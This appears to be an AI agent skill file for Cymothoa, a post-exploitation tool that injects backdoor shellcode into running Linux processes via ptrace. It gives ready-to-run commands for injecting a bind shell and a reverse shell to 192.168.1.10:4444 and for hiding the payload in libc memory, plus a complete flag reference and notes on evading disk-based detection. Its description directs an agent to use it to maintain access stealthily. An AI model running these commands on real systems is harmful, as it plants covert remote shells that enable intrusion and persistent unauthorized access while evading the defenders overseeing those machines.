---
name: cymothoa
description: Inject backdoor shellcode into existing running processes using the ptrace library for stealthy persistence. Use during post-exploitation to maintain access by hiding malicious code within legitimate process memory spaces, bypassing traditional file-based detection.
---

# cymothoa

## Overview
Cymothoa is a stealth backdooring tool that injects shellcode into an existing process. It uses the `ptrace` library to manipulate and infect processes at runtime. It includes helper utilities like `bgrep` for binary searching and `udp_server` for payload interaction. Category: Post-Exploitation.

## Installation (if not already installed)
Assume the tool is installed. If not, use:

```bash
sudo apt install cymothoa
```

## Common Workflows

### List available shellcodes
Before injecting, identify the payload index number:
```bash
cymothoa -S
```

### Inject a bind shell into a process
Inject shellcode (e.g., shellcode 1) into a specific PID, listening on a specific port:
```bash
cymothoa -p 1234 -s 1 -y 4444
```

### Inject a reverse shell
Inject shellcode that connects back to a listener:
```bash
cymothoa -p 1234 -s 2 -x 192.168.1.10 -y 4444
```

### Persistent injection with custom memory region
Search for a specific library mapping to hide the shellcode:
```bash
cymothoa -p 1234 -s 1 -l /lib/libc.so.6 -m /lib/libc.so.6
```

## Complete Command Reference

### cymothoa
```
Usage: cymothoa -p <pid> -s <shellcode_number> [options]
```

#### Main Options
| Flag | Description |
|------|-------------|
| `-p` | Process PID to infect |
| `-s` | Shellcode number (index from -S list) |
| `-l` | Memory region name for shellcode injection (default: `/lib/ld`). Searches for `r-xp` permissions in `/proc/pid/maps` |
| `-m` | Memory region name for persistent memory (default: `/lib/ld`). Searches for `rw-p` permissions in `/proc/pid/maps` |
| `-h` | Print help screen |
| `-S` | List available shellcodes |

#### Injection Options (Overwrite payload flags)
| Flag | Description |
|------|-------------|
| `-f` | Fork parent process |
| `-F` | Don't fork parent process |
| `-b` | Create payload thread (usually requires `-F`) |
| `-B` | Don't create payload thread |
| `-w` | Pass persistent memory address |
| `-W` | Don't pass persistent memory address |
| `-a` | Use alarm scheduler |
| `-A` | Don't use alarm scheduler |
| `-t` | Use setitimer scheduler |
| `-T` | Don't use setitimer scheduler |

#### Payload Arguments
| Flag | Description |
|------|-------------|
| `-j` | Set timer (seconds) |
| `-k` | Set timer (microseconds) |
| `-x` | Set the IP address |
| `-y` | Set the port number |
| `-r` | Set the port number 2 |
| `-z` | Set the username (4 bytes) |
| `-o` | Set the password (8 bytes) |
| `-c` | Set the script code (e.g., `"#!/bin/sh\nls; exit 0"`) |

---

### bgrep (Binary Grep)
Used to search for hexadecimal patterns within binary files.
```bash
bgrep <hex> [<path> [...]]
```

---

### udp_server
A simple UDP server utility provided with the toolkit.
```bash
udp_server <port>
```

## Notes
- **Stealth**: Because the code lives only in the memory of an existing process, it does not leave a footprint on the disk in the form of a malicious executable.
- **Permissions**: You generally need root privileges or the same privileges as the owner of the target process to use `ptrace` for injection.
- **Stability**: Injecting into critical system processes may cause instability or crashes if the memory regions or threading flags are misconfigured.